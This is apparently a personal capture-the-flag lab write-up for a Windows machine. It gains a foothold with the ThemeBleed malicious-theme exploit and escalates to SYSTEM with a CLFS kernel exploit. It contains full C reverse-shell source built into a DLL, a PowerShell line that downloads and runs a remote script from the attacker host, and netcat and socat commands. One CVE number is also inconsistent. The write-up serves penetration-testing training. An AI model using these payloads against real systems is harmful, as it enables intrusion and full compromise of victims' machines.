# Reconnaissance
- 
## Nmap Enumeration
- We pass the commands:
```bash
nmap -sV -sC -vv 10.10.11.237
nmap -sU --top-ports=10 -vv 10.10.11.237

---OUTPUT-TCP---
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
|_http-title: Aero Theme Hub
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


---OUTPUT-UDP---
n/a
```

## Directory Enumeration
- Gobuster:
- Directory
```bash
gobuster dir -u http://10.10.11.237 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root

---OUTPUT---
/home                 (Status: 200) [Size: 11650]
/Home                 (Status: 200) [Size: 11650]
/upload               (Status: 405) [Size: 0]
/Upload               (Status: 405) [Size: 0]
/HOME                 (Status: 200) [Size: 11650]
/%3FRID%3D2671        (Status: 200) [Size: 11650]

```
- Next Directory
```bash

```
- VHost
```bash
gobuster vhost
```
- Ffuf
```bash
ffuf
```
- Dirsearch
```bash
dirsearch -u
```
- Dirbuster
- 

## Website Enumeration
- 
### Direct
- Basically a simple web page about Windows themes
- Can Upload a file...but need right extension
- php reverse shell bypass?
## Initial Foothold
- On google we find Windows themes use a .theme extension
- We also find a vulnerability : CVE-2024-38146
- https://socprime.com/blog/cve-2023-38146-detection-windows-themebleed-rce-bugposes-growing-risks-with-the-poc-exploit-release/
```bash
The researcher Gabe Kirkpatrick who was the [first to report ThemeBleed](https://exploits.forsale/themebleed/) and the developer of the PoC code has covered the in-depth attack details. Leveraging the version number “999” creates a significant time gap in the process of verifying the DLL signature and library load within the routine for handling the MSSTYLES file, which can cause the emergence of a race condition. Further on, by applying the specifically generated MSSTYLES file, adversaries can exploit a race window to apply malicious DLL instead of a verified one, which enables them to run arbitrary code on the impacted system. In addition, the researcher adds that downloading a malicious Windows Theme file from the web triggers the ‘mark-of-the-web’ warning, which can notify a user of the potential threat. However, adversaries can bypass this alert by wrapping the theme into a THEMEPACK archive file.
```
- Extra: Can bypass warning with .themepack archive file
- POC Exploit:
- https://github.com/exploits-forsale/themebleed/tree/main
- **basically we create a dll that exports a VerifyThemeVersion which is where we will add our reverse shell. When the dll is called there is a race condition and there are 3 files, one of which is replaced with our dll exploit. Due to the race condition our exploit file which we used to replace one of these files gets executed giving our reverse shell**
- https://github.com/exploits-forsale/themebleed/releases/tag/v1
- Release to download
- Must be run on Windows
- **For linux it's the same method (just no need to tunnel through port to windows), just follow this PoC. We use this in the alternate method to test it:**
- https://github.com/Durge5/ThemeBleedPy
- Tried and it works and much easier than Windows route
- We also need a reverse shell for linux+ windows:
- We took this code and edited it :
- https://github.com/izenynn/c-reverse-shell/blob/main/windows.c
- Edited to :
```c
#include <winsock2.h>
#include <windows.h>
#include <io.h>
#include <process.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int ReverseShell(const char *CLIENT_IP, int CLIENT_PORT) {

        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
                write(2, "[ERROR] WSASturtup failed.\n", 27);
                return (1);
        }

        int port = CLIENT_PORT;
        struct sockaddr_in sa;
        SOCKET sockt = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

        if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
                write(2, "[ERROR] connect failed.\n", 24);
                return (1);
        }

        STARTUPINFO sinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES);
        sinfo.hStdInput = (HANDLE)sockt;
        sinfo.hStdOutput = (HANDLE)sockt;
        sinfo.hStdError = (HANDLE)sockt;
        PROCESS_INFORMATION pinfo;
        CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);

        return (0);
}
void VerifyThemeVersion() {
//        ReverseShell("10.10.14.25", 9999);
        ReverseShell("192.168.193.128",9999);
}

```
- Mainly removed some unneeded checks but most importantly:
- Added VerifyThemeVersion which is was the POC said was required for our exploit.
- Returns null hence void
- We install mingw-w64 to creatae a dll from this code:
```bash
sudo apt install mingw-w64
x86_64-w64-mingw32-gcc-win32 windows.c -shared -lws2_32 -o VerifyThemeVersion.dll
```
- Now we need to use our Windows Machine and download ThemeBleed POC.
- Might have to restore as Defender will delete
- Need to pull our dll file from our Kali machine to here
- To test if exploit is working:
- in c file change IP to the one that can be reached by Windows machine.
- in Windows machine pass this command with netcat listening on Kali:
```bash
rundll32 VerifyThemeVersion.dll,VerifyThemeVersion
```
- Should get shell. Remember to change IP back to tun0 IP
- Use python server and pull it from Windows via the IP reachable to Kali machine:port
- We make our exploit theme with ThemeBleed.exe
```bash
ThemeBleed.exe make_theme 10.10.14.25 exploit.theme
```
- Send it to our Kali Machine. (I had a shared folder so sent it via that)
- Delete stage_3 of our ThemeBleed data and replace it with our dll exploit.
- Renake our exploit stage_3
- Start the ThemeBleed server on Windows.
- We need to disable server service on Windows (and restart) as themebleed needs port 445 to listen
- On our Kali machine we need to forward anything from 445 to our Windows machine:
```bash
sudo socat TCP-LISTEN:445,fork,reuseaddr TCP:192.168.193.1:445
```
- We then turn on our netcat listener and upload our exploit.theme
- We should get an output like this. Basically a race condition is created and everytime it asks for dll, it changes slightly and eventually our exploit is run. It should succeed when it hits `LoadLibrary` and get a reverse shell on our listener
```bash
D:\OSCP\ThemeBleed>ThemeBleed.exe server
Server started
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 1 - Version check
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 2 - Verify signature
Client requested stage 3 - LoadLibrary  **
Client requested stage 2 - Verify signature
Client requested stage 1 - Version check
Client requested stage 1 - Version check
```
- We gain access as user sam.emerson
- user.flag
## Privilege Escalation
- In documents folder we see a CVE pdf file. We need to get it to our local machine to read it.
```bash
cd ../Documents
powershell
$b64 = [Convert]::ToBase64String([IO.FILE]::ReadAllBytes("CVE-2023-28252_Summary.pdf"))
$b64

---OUTPUT-B64---
JVBERi0xLjYKJcOkw7zDtsOfCjIgMCBvYmoKPDwvTGVuZ3RoIDMgMCBSL0ZpbHRlci9GbGF0ZURlY29kZT4+CnN0cmVhbQp4nKVYzc6sNgzdz1Ow7mKaOCEQqarEENhf6ZP6Av2RurhS76avX/s4CRDmy7eoRswPBMc+Pj42Y552+Pfxz2AG8zQ0D8HaZ5zsMEX9/PHH47efhu+6gl8//nq8Ph5jeM7DROEZh4/fh593O1gzfPz5i7GGjDPejCbwMeHbzEfkYzEvs5rEr83s1lj768ffj+3j8e2tcTs+Q2OczGrJOuvNbjY72sC/gp2sMYud2WC03lr+vrD5YF+47u3K6xfjbLIb30V8THxlt667vfFPum5vZ/jN5uzEBq3dTeItd3GIj0m21rN8ns+ahQx/rvxp1RVBgN1MvNbzqoV4ARmy5kVdZ0KkFmjybDLRiE08x+p5AziA2CVCRNs1O9vn2EDsKHBMZGHkgIq30V8AmHfyduQkrJpJ3lbzze7IagJSFG3qbj+ZG8QLNtlo4U08YvJ8JllPkU2PshW9ENvOGzHMtCrwxKlA5FSdmbqb+6mNnQSwjUbOGBtnqjmOoMvR4AJXT0MSWiTRxCbYlICzAY4FnBUWMkEUIFlXN+P4SKJPiFNiZ9DFIaTghbWJvzk+43spcAb3OSAmSVxkN9gVqpKs7QZFnt+vQQUw4A3EbHSC29O7xEjQbRIFCrZT08yfu
                                 <SNIP>
MDIwMDAzNzAwMkUwMDM0PgovQ3JlYXRpb25EYXRlKEQ6MjAyMzA5MjExODE4MTQrMDInMDAnKT4+CmVuZG9iagoKeHJlZgowIDE0CjAwMDAwMDAwMDAgNjU1MzUgZiAKMDAwMDAxMzIwNSAwMDAwMCBuIAowMDAwMDAwMDE5IDAwMDAwIG4gCjAwMDAwMDE1NTAgMDAwMDAgbiAKMDAwMDAxMzMwMyAwMDAwMCBuIAowMDAwMDAxNTcxIDAwMDAwIG4gCjAwMDAwMTE5ODcgMDAwMDAgbiAKMDAwMDAxMjAwOSAwMDAwMCBuIAowMDAwMDEyMTk3IDAwMDAwIG4gCjAwMDAwMTI3MzcgMDAwMDAgbiAKMDAwMDAxMzExOCAwMDAwMCBuIAowMDAwMDEzMTUwIDAwMDAwIG4gCjAwMDAwMTM0MDIgMDAwMDAgbiAKMDAwMDAxMzQ5OSAwMDAwMCBuIAp0cmFpbGVyCjw8L1NpemUgMTQvUm9vdCAxMiAwIFIKL0luZm8gMTMgMCBSCi9JRCBbIDw2MjVDNEQ2QjQ3NjREOUI3QzdDQzg0OTg1MTlGQzYxMj4KPDYyNUM0RDZCNDc2NEQ5QjdDN0NDODQ5ODUxOUZDNjEyPiBdCi9Eb2NDaGVja3N1bSAvRjBBQkY4NUJDOEIxQjkxRUYzMkVBNkM5RTUzM0QwMTQKPj4Kc3RhcnR4cmVmCjEzNjc0CiUlRU9GCg==
```
- We copy it to a file in our Kali machine:
```bash
vi CVE-2023-28252_Summary.b64 # copy contents here
base64 -d CVE-2023-28252_Summary.b64 > CVE-2023-28252_Summary.pdf
open CVE-2023-28252_Summary.pdf
```
- We find a PoC exploit :
- https://github.com/fortra/CVE-2023-28252
- It explains the whole process and as an identifier it spawns the notepad app.
- We open this in Visual Studio and replace the notepad with our Reverse Shell
- On our kali machine we get our TCP reverse shell ready and name it `onelinereverse.ps1`
```bash
sudo cp /opt/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 onelinereverse.ps1
vi onelinerreverse.ps1 # add our details
```
- We download the github repository on our Windows machine and open `clfs_eop.sln` on Visual Studio (**NOT Visual Studio Code**)
- we search for the notepad call (search for notepad or system as its a system call)
- We replace it with:
```c
		if (strcmp(username, "SYSTEM") == 0){
			printf("WE ARE SYSTEM\n");
			system("powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.25:8001/onelinereverse.ps1')");
```
- We Rebuilt it (Build> Rebuilt Solution)
- Shows the file path.
- We copy the exe file to our kali machine. (I have a shared folder so I copied it via that)
- Keep the file in the same location as reverse shell where we will start up our server
```bash
python3 -m http.server 8001
```
- We also turn on our netcat listener at the port we specified:
```bash
nc -lvnp 9999
```
- Then on our target machine (as sam.enderson) we pass the command calling our exe file and then we execute it.
```powershell
curl http://10.10.14.25:8001/clfs_eop.exe -o clfs_eop.exe
.\clfs_eop.exe

---OUTPUT---
[+] Incorrect number of arguments ... using default value 1208 and flag 1 for w11 and w10


ARGUMENTS
[+] TOKEN OFFSET 4b8
[+] FLAG 1


VIRTUAL ADDRESSES AND OFFSETS
[+] NtFsControlFile Address --> 00007FFBC85A4240
[+] pool NpAt VirtualAddress -->FFFFD28198AA4000
[+] MY EPROCESSS FFFFA484081C90C0
[+] SYSTEM EPROCESSS FFFFA48401ED0040
[+] _ETHREAD ADDRESS FFFFA48406E90080
[+] PREVIOUS MODE ADDRESS FFFFA48406E902B2
[+] Offset ClfsEarlierLsn --------------------------> 0000000000013220
[+] Offset ClfsMgmtDeregisterManagedClient --------------------------> 000000000002BFB0
[+] Kernel ClfsEarlierLsn --------------------------> FFFFF8053F4C3220
[+] Kernel ClfsMgmtDeregisterManagedClient --------------------------> FFFFF8053F4DBFB0
[+] Offset RtlClearBit --------------------------> 0000000000343010
[+] Offset PoFxProcessorNotification --------------------------> 00000000003DBD00
[+] Offset SeSetAccessStateGenericMapping --------------------------> 00000000009C87B0
[+] Kernel RtlClearBit --------------------------> FFFFF80541743010
[+] Kernel SeSetAccessStateGenericMapping --------------------------> FFFFF80541DC87B0

[+] Kernel PoFxProcessorNotification --------------------------> FFFFF805417DBD00


PATHS
[+] Folder Public Path = C:\Users\Public
[+] Base log file name path= LOG:C:\Users\Public\45
[+] Base file path = C:\Users\Public\45.blf
[+] Container file name path = C:\Users\Public\.p_45
Last kernel CLFS address = FFFFD28198E42000
numero de tags CLFS founded 10

Last kernel CLFS address = FFFFD2819EEE9000
numero de tags CLFS founded 1

[+] Log file handle: 00000000000000EC
[+] Pool CLFS kernel address: FFFFD2819EEE9000

number of pipes created =5000

number of pipes created =4000
TRIGGER START
System_token_value: FFFFD2819784159D
SYSTEM TOKEN CAPTURED
Closing Handle
ACTUAL USER=SYSTEM

```
- We get reverse shell on our listener as admin user



### Via BurpSuite
- 

--------------
## Initial Foothold in Website
- 

------------
## Privilege Escalation in Website
- 

----------
## Initial Foothold in Target

- 
----------
## Lateral Movement in Target
- 
-----------
## Privilege Escalation in Target
- 
-------
--------